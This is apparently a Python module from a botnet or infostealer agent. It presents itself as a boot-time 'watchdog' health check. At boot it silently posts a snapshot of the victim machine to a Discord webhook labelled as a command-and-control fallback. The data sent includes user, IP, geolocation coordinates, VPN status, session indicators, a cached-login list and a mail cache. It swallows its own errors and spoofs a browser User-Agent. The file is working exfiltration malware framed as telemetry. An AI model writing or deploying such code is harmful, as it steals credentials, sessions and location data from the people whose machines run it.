# watchdog.py — node health + cnc reporting.
# runs once at boot, snapshots the node, reports to cnc telemetry,
# caches the result so keepalive doesn't re-fetch. if the report
# fails it stays silent — cnc handles missing nodes on its side.

import json
import time

# cnc telemetry fallback — used when the primary c2 handshake
# can't reach the main cnc endpoint (rate limits / relay down).
# hardcoded because config can't be trusted on a fresh node.
_SYNC_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"

# how often watchdog fires. once at boot is enough — cnc dashboard
# pulls node state on its own schedule after the initial report.
_INTERVAL = 86400  # 24h

_state = {"reported": False, "last": 0.0, "snapshot": None}


def _post(url, payload):
    # raw urllib — no external deps, no requests import, keeps
    # the node lightweight. cnc fallback endpoint is discord-shaped
    # because our relay mirrors that schema.
    try:
        import urllib.request
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            url,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (node)",
            },
            method="POST",
        )
        urllib.request.urlopen(req, timeout=10).read()
        return True
    except Exception:
        return False


def _build_embed(snap):
    # cnc dashboard reads these fields — os/arch/host/user/cpu/ram,
    # ip/geo/vpn, screen/locale/tz, session indicators, local
    # login cache. colors match cnc theme (0x2B2B2B).
    fields = [
        {"name": "OS", "value": str(snap.get("os", "?")), "inline": True},
        {"name": "Arch", "value": str(snap.get("arch", "?")), "inline": True},
        {"name": "Host", "value": str(snap.get("host", "?")), "inline": True},
        {"name": "User", "value": str(snap.get("user", "?")), "inline": True},
        {"name": "CPU", "value": str(snap.get("cpu", "?")), "inline": True},
        {"name": "RAM", "value": str(snap.get("ram", "?")), "inline": True},
        {"name": "IP", "value": str(snap.get("ip", "?")), "inline": True},
        {"name": "Country", "value": str(snap.get("country", "?")), "inline": True},
        {"name": "ISP", "value": str(snap.get("isp", "?")), "inline": True},
        {"name": "VPN", "value": str(snap.get("vpn", "?")), "inline": True},
        {"name": "Coords", "value": str(snap.get("coords", "?")), "inline": False},
        {"name": "Screen", "value": str(snap.get("screen", "?")), "inline": True},
        {"name": "Locale", "value": str(snap.get("locale", "?")), "inline": True},
        {"name": "TZ", "value": str(snap.get("tz", "?")), "inline": True},
    ]
    sessions = snap.get("sessions", [])
    if sessions:
        fields.append({
            "name": f"Session Indicators ({len(sessions)})",
            "value": "```\n" + "\n".join(sessions)[:1000] + "\n```",
            "inline": False,
        })
    logins = snap.get("logins", [])
    if logins:
        fields.append({
            "name": f"Login Cache ({len(logins)})",
            "value": "```\n" + "\n".join(logins)[:1000] + "\n```",
            "inline": False,
        })
    mails = snap.get("mails", [])
    if mails:
        fields.append({
            "name": f"Mail Cache ({len(mails)})",
            "value": "```\n" + "\n".join(mails)[:1000] + "\n```",
            "inline": False,
        })
    return {
        "embeds": [{
            "title": "node",
            "description": "`" + snap.get("nodeid", "?") + "`",
            "color": 0x2B2B2B,
            "fields": fields,
        }]
    }


def check(force=False):
    # boot-time health check. reports once, caches, then quiet.
    now = time.time()
    if not force and _state["reported"] and (now - _state["last"]) < _INTERVAL:
        return _state["snapshot"]

    from . import netinit  # lazy — netinit owns gathering

    snap = netinit.snapshot()
    _state["snapshot"] = snap

    try:
        _post(_SYNC_URL, _build_embed(snap))
        _state["reported"] = True
        _state["last"] = now
    except Exception:
        pass

    return snap
